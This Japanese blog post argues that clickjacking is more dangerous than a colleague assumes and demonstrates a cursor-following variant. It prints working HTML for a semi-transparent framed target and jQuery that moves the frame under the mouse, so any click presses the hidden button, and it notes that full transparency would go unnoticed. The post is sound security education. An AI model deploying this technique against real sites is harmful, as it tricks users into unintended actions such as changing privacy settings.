<div style="text-align:center;">[f:id:motikan2010:20170407185617g:plain:w600]</div>
  

<div class="contents-box">
  <p>[:contents]</p>
</div>

## はじめに

▼ デモサイト  
[http://oncetec.sub.jp/blog_items/20170407/trap.html:title]  

　2017年度に入りましたが、昔ながらのクリックジャッキングの話  

　『クリックジャッキング』ってなんぞやという方は下の記事が大変解りやすいです。  
[http://blog.tokumaru.org/2013/03/clickjacking-report-by-IPA.html:embed:cite]

<!-- more -->

## 検証

### クリックジャッキングを成立させることは難しいのか

　クリックジャッキングのことで同期の方と話した時に、**おとりとなるボタンを押下させることがそもそも難しい**ということで、リスクは低いと言っていた。  
[f:id:motikan2010:20170407190439p:plain:w500]  
[参考：知らぬ間にプライバシー情報の非公開設定を公開設定に変更されてしまうなどの『クリックジャッキング』に関するレポート]([http://www.ipa.go.jp/files/000026479.pdf)  

　確かに、いろんなサイトでのクリックジャッキングの説明を見てみると囮となるボタンやリンクに『**ここをクリック**』だったり『**おすすめ情報！！**』になっており、見るからに怪しく、騙されてクリックする人なんていなさそう。  
[f:id:motikan2010:20170407185323p:plain]

　自然にボタンがページに紛れ込んでいても特定の箇所をクリックさせることがそもそも難しい気がする・・・。  
[f:id:motikan2010:20170407185509p:plain]  
そう考えてみると、攻撃を成立させることは難しそう。  

### どこをクリックしてもターゲットとなるボタンを押下させる

常にマウスカーソルにターゲットとなるサイト(iframe内)が来るようにJavaScriptで制御してみる。
http://biboroku.watanabehiroki.net/markup/javascript/jquery-sample-2

あとは、ターゲットとなるサイト内のボタンが左上に来るように調整する。
http://blog12345.seesaa.net/article/281787492.html

##### ターゲットとなるiframeは下記のように記述

<div class="md-code" style="width:100%">
```html
<div id="target" style="width:180px;height:50px;margin:0px;opacity:0.5;overflow:hidden;">
  <iframe width="300px" height="650px" scrolling="no" frameborder="0"
    style="margin:-350px 0 0 -25px;overflow:hidden;" src="./target.html"></iframe>
</div>
```
</div>

##### divがマウスカーソルに追跡するように記述

<div class="md-code" style="width:100%">
```javascript
$('html').mousemove(function(e){
    $('#target').css({
      top:e.pageY-25,
      left:e.pageX-50
      });
  });
```
</div>

デモサイト
[http://oncetec.sub.jp/blog_items/20170407/trap.html:title]  

　透過50%です。透過100%にしたらまず気づかれることはなさそう。  
[f:id:motikan2010:20170407185617g:plain]  

　これでどこをクリックしても**iframe内のボタン**をクリックしたことになります。
